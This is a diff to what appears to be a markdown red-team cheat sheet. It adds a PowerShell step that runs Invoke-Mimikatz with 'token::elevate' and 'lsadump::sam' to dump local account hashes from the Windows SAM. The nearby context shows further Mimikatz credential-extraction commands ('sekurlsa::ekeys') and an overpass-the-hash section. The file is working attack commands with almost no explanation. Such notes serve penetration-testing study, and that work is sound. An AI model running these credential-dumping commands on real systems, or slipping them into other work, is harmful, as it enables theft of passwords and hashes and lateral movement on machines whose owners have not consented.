@@ -102,6 +102,10 @@ C:> . .\Invoke-Mimikatz.ps1
 ```powershell
 C:> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
 ```
+##### Extract credentials from SAM
+```powershell
+C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
+```
 ##### OverPass the Hash (OPTH
 ```powershell
 # Starts Powershell with logon type 9
